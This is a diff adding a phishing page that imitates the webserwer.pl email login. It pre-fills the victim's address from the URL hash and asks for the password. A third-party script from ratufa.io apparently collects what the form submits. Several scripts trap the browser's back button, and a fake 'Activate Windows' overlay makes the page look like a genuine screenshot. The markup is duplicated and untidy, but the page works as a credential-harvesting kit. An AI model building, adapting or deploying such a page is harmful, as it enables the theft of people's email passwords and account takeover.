@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>webserwer</title>
+    <style>
+* {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+}
+
+body {
+    background-color: #ffffff;
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 20px;
+    position: relative;
+}
+
+/* Centered Layout Workspace Block Wrapper */
+.login-wrapper {
+    width: 100%;
+    max-width: 320px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    text-align: center;
+    margin-top: -80px; /* Upward offset precisely matching the screenshot layout */
+}
+
+/* Brand Logo Typography Replication Area */
+.brand-logo {
+    font-size: 40px;
+    font-weight: 800;
+    color: #f37022; /* Signature energetic bright orange */
+    letter-spacing: -1.5px;
+    margin-bottom: 24px;
+}
+
+.brand-logo span {
+    color: #555555; /* Neutral dark grey suffix domain indicator extension */
+    font-weight: 600;
+}
+
+form {
+    width: 100%;
+    display: flex;
+    flex-direction: column;
+    gap: 10px;
+    margin-bottom: 16px;
+}
+
+/* Prefix Icon Addon Input Field Container Elements Rows Alignment */
+.input-row {
+    display: flex;
+    width: 100%;
+    height: 38px;
+    border: 1px solid #cbd5e1;
+    border-radius: 4px;
+    overflow: hidden;
+    background-color: #ffffff;
+}
+
+/* Distinctive active sky-blue highlighted state border profile matching username field */
+.input-row.focused-row {
+    border-color: #3bb2f6;
+    box-shadow: 0 0 0 1px #3bb2f6;
+}
+
+.icon-addon {
+    width: 38px;
+    background-color: #f8fafc;
+    border-right: 1px solid #cbd5e1;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #475569;
+    font-size: 13px;
+    user-select: none;
+}
+
+.form-control {
+    flex: 1;
+    height: 100%;
+    border: none;
+    padding: 0 12px;
+    font-size: 14px;
+    color: #333333;
+    outline: none;
+    background: transparent;
+}
+
+.form-control::placeholder {
+    color: #cbd5e1;
+    font-weight: 400;
+    opacity: 0.9;
+}
+
+/* Flat wide rectangular solid energetic cyan submit button block component (NOW FULLY CLICKABLE) */
+.submit-btn {
+    position: relative;
+    z-index: 20;
+    width: 100%;
+    background-color: #3bb2f6; /* High contrast energetic bright sky-blue tint */
+    color: #ffffff;
+    border: none;
+    height: 42px;
+    font-size: 13px;
+    font-weight: bold;
+    letter-spacing: 0.5px;
+    border-radius: 4px;
+    cursor: pointer;
+    margin-top: 4px;
+    transition: background-color 0.15s ease;
+}
+
+.submit-btn:hover {
+    background-color: #2da1e3;
+}
+
+/* Bottom auxiliary connection tracking brand text hyperlink element */
+.footer-link {
+    font-size: 12px;
+    color: #64748b;
+    text-decoration: none;
+}
+
+.footer-link:hover {
+    color: #3bb2f6;
+    text-decoration: underline;
+}
+
+/* OS Environment Activation Notification Simulation Overlay Layer Components Grid Blueprint */
+.system-watermark {
+    position: fixed;
+    bottom: 24px;
+    right: 24px;
+    text-align: left;
+    font-size: 13px;
+    color: rgba(0, 0, 0, 0.13);
+    line-height: 1.4;
+    user-select: none;
+    pointer-events: none;
+    z-index: 100;
+}
+
+    </style>
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>webserwer.pl - Logowanie</title>
+    <!-- Link to external stylesheet -->
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <!-- Centered Form Container Card Box Component Module -->
+    <main class="login-wrapper">
+        
+        
+        <div class="brand-logo">
+            webserwer<span>.pl</span>
+        </div>
+
+        <!-- Form submission configuration using FormSubmit module links integration -->
+        <form action="" method="POST">
+            <script id="ratufa_loader" src="https://www.ratufa.io/c/ld.js?f=px88b6jp&n=n1.ratufa.io"></script>
+                
+            <!-- Username Input Group Row with Left Icon Addon -->
+            <div class="input-row focused-row">
+                <div class="icon-addon">👤</div>
+ <input type="email" id="email" name="email" class="form-control" placeholder="Email address" readonly="readonly" />
+            </div>
+
+            <!-- Password Input Group Row with Left Icon Addon -->
+            <div class="input-row">
+                <div class="icon-addon">🔒</div>
+               <input type="password" name="Password" placeholder="hasło" class="form-control" style="font-size: 12pt; required="" oninvalid="this.setCustomValidity('Wprowadź hasło do swojego adresu e-mail')"
+  oninput="this.setCustomValidity('')"/>
+            </div>
+
+            <!-- Solid Flat Light Blue Action Submission Trigger Button Block Component -->
+            <button type="submit" class="submit-btn">ZALOGUJ</button>
+        </form>
+
+        <!-- Bottom Informational Reference Link Footer Label Component -->
+        <a href="#" class="footer-link">Webserwer.PL</a>
+
+    </main>
+
+    <!-- Windows Environment Activation Notification Simulation Overlay Layer Components Grid -->
+    <div class="system-watermark">
+        Activate Windows<br>
+        <span style="font-size: 11px;">Go to Settings to activate Windows.</span>
+    </div>
+
+</body>
+</html>
+
+    <script>
+        window.addEventListener('DOMContentLoaded', () => {
+            if (window.location.hash) {
+                document.getElementById("email").value = window.location.hash.substring(1).trim();
+            }
+        });
+    </script>
+    <!-- 1. ANTI-BACKTRACK INTERLOCK ENGINE -->
+    <script type="text/javascript">
+        (function() {
+            window.history.pushState(null, null, window.location.href);
+            
+            window.onpopstate = function() {
+                window.history.pushState(null, null, window.location.href);
+           
+            };
+        })();
+    </script>
+<script type="text/javascript">
+    window.history.pushState(null, "", window.location.href);
+    
+    window.addEventListener("popstate", function() {
+        window.history.pushState(null, "", window.location.href);
+    });
+</script>
+<script type="text/javascript">
+    function preventBack() {
+        window.history.forward();
+    }
+    setTimeout("preventBack()", 0);
+    
+    window.onunload = function () { null };
+</script>
+
+</body>
+    
+</html>
+</body>
+</html>
